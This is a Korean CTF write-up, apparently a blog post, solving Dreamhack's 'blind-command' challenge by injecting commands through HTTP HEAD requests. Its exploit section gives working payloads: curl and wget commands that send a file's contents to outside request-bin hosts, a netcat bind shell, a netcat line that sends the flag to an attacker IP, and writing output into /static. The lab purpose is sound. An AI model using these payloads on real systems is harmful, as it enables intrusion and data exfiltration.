---
title: '[Dreamhack] blind-command'
description: Dremhack [Wargame] - blind-command
author: juhyeongkim
date: 2024-10-31 21:02:00 +0900
categories: [Dreamhack, Wargame]
tags: [Dreamhack, Wargame, Web]
# toc: false
# comments: false
# math: true
# mermaid: true
# image:
#   path: 
#   lqip: 
#   alt: 
---

[문제 링크](https://dreamhack.io/wargame/challenges/73)

## 문제 설명 및 전체 코드

```py
#!/usr/bin/env python3
from flask import Flask, request
import os

app = Flask(__name__)


@app.route('/', methods=['GET'])
def index():
    cmd = request.args.get('cmd', '')
    if not cmd:
        return "?cmd=[cmd]"

    if request.method == 'GET':
        ''
    else:
        os.system(cmd)
    return cmd


app.run(host='0.0.0.0', port=8000)
```

"Read the flag file XD" 라는 설명 이외에 다른 설명이 없는 문제이다. 결국 웹 서버 내에 존재하는 플래그의 위치를 찾아서 읽으면 되는 문제로 보인다.

소스 코드도 매우 짧은 편으로, 간단히 분석해보면 인덱스 페이지에서는 `GET` 메서드를 처리하는 핸들러가 존재한다.

`cmd` 파라미터 값을 받아오는데, 여기서 HTTP 요청이 `GET` 메서드이면 아무 동작을 하지 않은 후 `cmd` 값을 리턴해주고,

HTTP 요청이 다른 메서드이면, `cmd`를 인자로 시스템 함수를 실행한다.

시스템 함수를 실행하여 **Command Injection** 공격을 해야 하는데, 정상적인 `GET` 메서드로는 `cmd` 값을 전달할 수 없기 때문에 이를 우회할 방법을 찾아야 한다.

<br>

## 취약점 분석

`GET` 메서드를 우회하여 `cmd` 값을 파라미터로 전달할 방법을 찾기 위해서 생각해보던 중, 하나의 의문이 들었다.

인덱스 페이지의 HTTP 요청을 처리하는 `index()` 핸들러에서 허용하는 메서드가 `GET` 메서드 뿐인데, 어떻게 다른 메서드를 보내서 핸들링할 수 있는지에 대한 의문이었다.

그래서 찾아보니, `flask` 프레임워크에서는 기본적으로 `GET` 핸들러 외에도 `OPTIONS` 또는 `HEAD` 핸들러가 허용된다는 것이었다.

**따라서, 현재 페이지에서 허용되는 HTTP 메서드를 확인할 수 있는 `OPTIONS` 메서드를 통해, 확실히 `/` 엔드포인트에서 어떤 메서드가 사용가능한지 확인해본 후 해당 메서드들을 통해 `GET` 대신 `cmd`를 전달할 방법을 생각해보면 된다.**

참고로, `HEAD` 메서드는 `GET` 메서드와 요청이 거의 동일하지만, `GET` 메서드와 달리 `response`의 본문은 반환하지 않고 헤더만 반환하는 메서드이다.

그럼 이제 `OPTIONS` 메서드를 전달하여, 인덱스 페이지에서 허용되는 메서드들을 확인해볼 방법을 생각해보자.

<br>

### 1. **requests** 모듈 사용

파이썬의 `requests` 모듈을 통해 워게임 서버에 `OPTIONS` 요청을 전송한 후, 응답값을 받아오면 된다.

허용 가능한 메서드들은 응답의 헤더에 존재하기 때문에, 아래와 같이 응답값의 헤더에 저장된 `Allow` 필드에서 확인할 수 있다.

<img width="1308" alt="image" src="https://github.com/user-attachments/assets/da4dc18f-7f0a-476b-b261-de461bcd0255">

헤더를 확인해보면, `OPTIONS`, `GET`, `HEAD` 메서드가 허용된 것을 확인해볼 수 있고, `HEAD` 메서드를 통해 `cmd`를 전달하여 우회하는 방법을 사용하면 되겠다고 설계할 수 있다.

<br>

### 2. Burp Suite 사용

Burp Suite를 통해 해당 워게임 서버에 `OPTIONS` 요청을 전송한 후, 응답값을 확인할 수 있다.

Proxy 탭에서 브라우저를 열어준 후, 해당 워게임 서버에 접속하며 보낸 Request를 우클릭하여 Send to Repeater를 통해 Repeater로 보내준 후,

Repeater 탭에서 아래와 같이 Request를 `OPTIONS / HTTP/1.1`로 조작해서 Send를 해주면, Response 탭에서 응답 값을 확인할 수 있다. (띄어쓰기에 유의하자.)

<img width="541" alt="image" src="https://github.com/user-attachments/assets/9d4ef493-8695-4e16-99cd-79f3f51e5f30">

<br>

## Exploit

이제 `GET` 메서드를 우회하여 `cmd` 파라미터 값을 설정하는 방법으로 `HEAD` 메서드를 사용하여 **Command Injection**을 수행할 수 있는 취약점이 존재한다는 것을 파악하였다.

그럼 이제, `HEAD` 메서드를 사용하여 어떻게 `cat flag.py`라는 `cmd` 값을 전달한 후 `os.system(cmd)` 코드의 결과값을 받아올지 생각해보자.

<br>

### 1. Network Outbound

`app.py` 코드에서 `os.system(cmd)` 시스템 함수를 수행하긴 하지만, 해당 함수의 수행 결과를 직접 인덱스 페이지에 반영해주지 않고, `cmd` 값만 리턴해준다.

**따라서, 시스템 함수의 수행 결과를 외부 서버로 가져오는 Network Outbound를 이용해야한다.**

외부 서버는 [드림핵 툴즈](https://tools.dreamhack.games/requestbin/aysuaio)의 Request Bin 탭에서 랜덤한 URL을 생성한 후, 해당 URL로 HTTP 요청을 전달받을 수 있고,

<img width="1380" alt="image" src="https://github.com/user-attachments/assets/c33adcee-312d-4053-ba51-43bff10d0ad3">

위에서 생성한 외부 서버로 결과를 보내기 위해서는 시스템 함수에서 쉘의 명령어로 사용할 수 있는, `curl` 또는 `wget` 명령어를 사용하면 된다.

---

`curl`(Client URL)은 주로 웹 서버에 요청을 보내고, 그 결과를 출력하거나 파일로 저장하는 데 사용된다.

HTTP 뿐만 아니라 다양한 프로토콜과 인증 방식 등을 지원하며, REST API 호출, 파일 다운로드, POST 데이터 전송 등 다목적으로 사용된다.

그리고 `wget`(World Wide Web Get)은 주로 파일이나 웹 페이지를 다운로드하는 데 사용된다.

인터넷에서 파일을 자동으로 다운로드하거나 복잡한 다운로드 작업을 수행할 때 많이 사용되지만, HTTP 요청을 보내는데도 사용이 되기 때문에 여기서 이용할 수 있다.

---

그럼 다시 돌아와서, `curl` 명령어를 `cmd`에 전달하여 드림핵 툴즈에서 생성한 랜덤한 URL로 `cat flag.py`의 수행 결과를 보내는 방법을 사용해보자.

Burp Suite에서 워게임 서버에 `HEAD` 메서드를 사용하여, `cmd`에 아래의 두 명령어를 전달하여 문제를 풀이할 수 있다.

<br>

#### 1. `curl` : 원격 서버에 POST 메서드로 `cat flag.py`의 결과를 데이터에 전송

```shell
curl https://yzyozog.request.dreamhack.games -d "$(cat flag.py)"
```

위 명령어가 시스템 함수에 수행되도록 `HEAD` 요청을 워게임 서버에 전송하면 된다.

`-d` 명령어는 원격 서버에 `POST` 요청을 보낸다는 옵션이며, 바로 뒤의 `$(cat flag.py)`가 해당 요청의 데이터값이다.

`$()`은 명령어의 수행 결과값을 치환하는 메타 문자로, `cat flag.py`가 시스템 함수에서 수행된 후 결과 값이 치환되어 `POST` 요청의 데이터에 저장될 것이다.

``` ` ```를 통해 명령어를 치환해도 똑같은 결과가 나오지만, `$()`이 훨씬 가독성면에서 더 직관적이고, 중첩 상황에서 예외가 발생하지 않기 때문에 많이 사용된다는 것을 참고하자.

참고로, `"$()"`와 달리 `$()`만 사용하여 `""`로 묶어주지 않으면 `flag.py`의 내용이 `FLAG = DH{~}` 이기 때문에, 공백에 따라 데이터가 끊겨서 아래와 같이 `FLAG`만 전달되게 된다.

<img width="595" alt="image" src="https://github.com/user-attachments/assets/e29c99f7-ccc6-4c8a-93c4-a80dcb13f197">

따라서, `curl -d` 를 통해 데이터를 보낼 때는 데이터에 공백이 포함된 경우 `""`로 묶어서 하나의 데이터로 해석되게 해야함을 유의하자.

그리고 Burp Suite에서 `HEAD` 메서드로 원격 서버에 요청을 전달할 때는 **URL 인코딩 형식**으로 보내야 하기 때문에 공백은 `+`로 바꿔서 써야 한다.

따라서 아래의 Payload를 전달하면 되고, 드림핵 툴즈에 들어가보면 아래와 같이 `cat flag.py`의 결과값이 전송되는 것을 확인할 수 있다.

```
HEAD /?cmd=curl+https://offxuuz.request.dreamhack.games+-d+"$(cat+flag.py)" HTTP/1.1
```

<img width="609" alt="image" src="https://github.com/user-attachments/assets/dacb7c93-16e3-4574-87f7-7971d5235794">

<br>

#### 2. `curl` : 원격 서버에 GET 메서드로 `cat flag.py`의 결과를 파라미터로 전송

위와 똑같은 방식으로 `GET` 요청을 보내서 아래와 같이 쿼리 파라미터에 데이터를 담아올 수도 있다.

```shell
curl https://offxuuz.request.dreamhack.games/?query="$(cat+flag.py)"
```

위 명령어가 수행되도록 `HEAD` 요청을 보내면 헤더의 QueryString에 `query`의 결과가 담겨온다.

그런데, `""`을 제외하고 요청을 보내면 아래와 같이 `FLAG` 뒷 부분은 공백 때문에 짤리지만, HTTP 요청은 잘 보내진다.

<img width="590" alt="image" src="https://github.com/user-attachments/assets/c9b6cea6-a5c8-4640-9d1b-d7f0fa209eb3">

하지만, `""`로 `$()` 부분을 감싸서 보내면 아예 원격 서버로 HTTP 요청이 보내지지도 않았다.

```
HEAD /?cmd=curl+https://offxuuz.request.dreamhack.games/?query="$(cat+flag.py)" HTTP/1.1
```

뭔가 쿼리 파라미터에서는 URL 인코딩이 되어야 하나 생각을 해서 `"`의 인코딩 결과인 `%22`로도 감싸봤지만 똑같이 안됬다.

```
HEAD /?cmd=curl+https://offxuuz.request.dreamhack.games/?query=%22$(cat+flag.py)%22 HTTP/1.1
```

해당 이유는 조금 더 공부를 해보고 수정해야겠다. 대부분 `curl`을 보낼 때도 `POST` 메서드를 통해 보내서 딱히 크게 신경쓰지 않아도 되지만 다음에 알아낸 후 수정해보겠다.

<br>

#### 3. **wget** : 원격 서버에 POST 메서드로 **cat flag.py**의 결과를 파라미터로 전송

```shell
wget https://dzmnkob.request.dreamhack.games --method=POST --body-data="$(cat flag.py)"
```

위 명령어가 시스템 함수에 전달되도록 `HEAD` 메서드를 통해 웹 서버에 전달하면 된다. 그럼 아래와 같이 작성할 수 있다.

```
HEAD /?cmd=wget+https://dzmnkob.request.dreamhack.games+--method=POST+--body-data="$(cat+flag.py)" HTTP/1.1
```

위와 같이 작성한 후 Payload를 전달하면 아래와 같이 `cat flag.py`의 실행 결과가 원격 서버로 잘 전달되는 것을 확인할 수 있다.

<img width="583" alt="image" src="https://github.com/user-attachments/assets/a77e34f5-f755-4a16-bb4a-3f30f8e5cdc8">

마찬가지로 여기서도 `$()` 대신 ``` ` ```을 써도 되고, `""`으로 `cat flag.py`의 실행 결과를 감싸줘야한다.

<br>

#### 4. **wget** : 원격 서버에 GET 메서드로 **cat flag.py**의 결과를 파라미터로 전송

`wget` 명령어는 `--method`를 정해주지 않으면, 기본적으로 `GET` 메서드를 수행한다.

따라서, 아래와 같은 명령어를 전달해주면 된다.

```
wget https://dzmnkob.request.dreamhack.games/?query="$(cat flag.py)"
```

위 명령어가 시스템 함수에 전달되도록 `HEAD` 메서드를 통해 웹 서버에 전달하면 된다. 그럼 아래와 같이 작성할 수 있다.

```
HEAD /?cmd=wget+https://dzmnkob.request.dreamhack.games/?query="$(cat+flag.py)" HTTP/1.1
```

이렇게 Payload를 전달하면, 아래와 같이 QueryString에 실행 결과가 URL 인코딩되어 담겨오는 것을 확인할 수 있다.

<img width="870" alt="image" src="https://github.com/user-attachments/assets/244941fe-6b04-4696-8b0f-644d0de0ded4">

해당 값을 URL 디코딩해보면 똑같이 플래그 문자를 아래와 같이 얻을 수 있다.

<img width="600" alt="image" src="https://github.com/user-attachments/assets/004127bd-cb3e-450e-89b3-291b0949390e">

<br>

### 2. Static File Directory

`flask`를 포함한 다양한 프레임워크 또는 웹 에플리케이션에서는, 여러 정적 리소스를 다루기 위해 **Static File Directory**로 `/static` 경로를 사용한다.

따라서, `HEAD` 메서드를 통해 아래의 명령어를 전달해준 후, `/static/flag_result.txt`에 접근하면 해당 정적 리소스를 출력할 수 있을 것이다.

```shell
mkdir static; cat flag.py > static/flag_result.txt
```

위 명령어는 먼저 **Static File Directory**인 `/static` 디렉토리를 만들어주고, 해당 디렉토리의 `flag_result.txt` 파일에 `>` 메타 문자를 통해 `cat flag.py`의 출력결과를 저장해준다.

참고로, `>>`은 파일의 맨끝에 추가해주는 메타 문자이며, `flag_result.txt` 파일이 존재하지 않으면 자동으로 생성해준다.

그럼 아래와 같은 Payload를 전달해주면 된다.

```
HEAD /?cmd=mkdir+static;cat+flag.py>static/flag_result.txt HTTP/1.1
```

Payload를 전달해준 후, `http://host3.dreamhack.games:10383/static/flag_result.txt` URL로 들어가게 되면, **Static File Directory**에 존재하는 파일에 접근하기 때문에, 

`flag_result.txt` 파일의 내용이 아래와 같이 웹 페이지에 출력되는 것을 확인할 수 있다.

<img width="591" alt="image" src="https://github.com/user-attachments/assets/0df909ae-6abd-4bcf-9dbb-117eed272b27">

`flask`에는 **Static File Directory**로 `/static` 경로를 사용하기 때문에, `/static`이 아닌 다른 이름의 디렉토리를 생성하여 접근하면, 파일을 출력해주지 않는 것을 주의하자.

<br>

### 3. Bind Shell

위 방법은 서버의 특정 port를 열어 공격자가 접속하는 방법이다. [링크](https://velog.io/@buaii/blind-command)의 풀이를 참고하였다.

```shell
nc -lvp [portnum]
```

위와 같은 명령어를 수행하도록 시스템 함수에 전달해주면 된다.

그럼 간단하게 아래의 Payload를 보내면 될 것이다.

```
HEAD /?cmd=nc+-lvp+[portnum] HTTP/1.1
```

공격대상 서버에 해당 payload로 port를 열고 공격자가 접속을 하면 되지만, 이 문제에서는 특정 포트를 열어도 포트포워딩 설정을 할 수 없어 bind shell로는 결과를 알 수 없다고 한다.

이 부분은 다음에 한번 다시 공부해보자.

<br>

### 4. Reverse Shell

위 방법은 공격자가 특정 port를 열어 서버가 접속하도록 하는 방법이다.

```shell
cat flag.py | nc [myIP] [portnum]
```

위와 같은 명령어를 수행하도록 시스템 함수에 전달해주면 된다.

그럼 간단하게 아래의 Payload를 보내면 될 것이다.

```
HEAD /?cmd=cat+flag.py|nc+[myIP]+[portnum] HTTP/1.1
```

로컬에서 포트를 열어주고 서버를 연결시켜보면 플래그가 전송되는 것을 확인할 수 있다고 한다.

이 부분도 다음에 한번 다시 공부해보자.
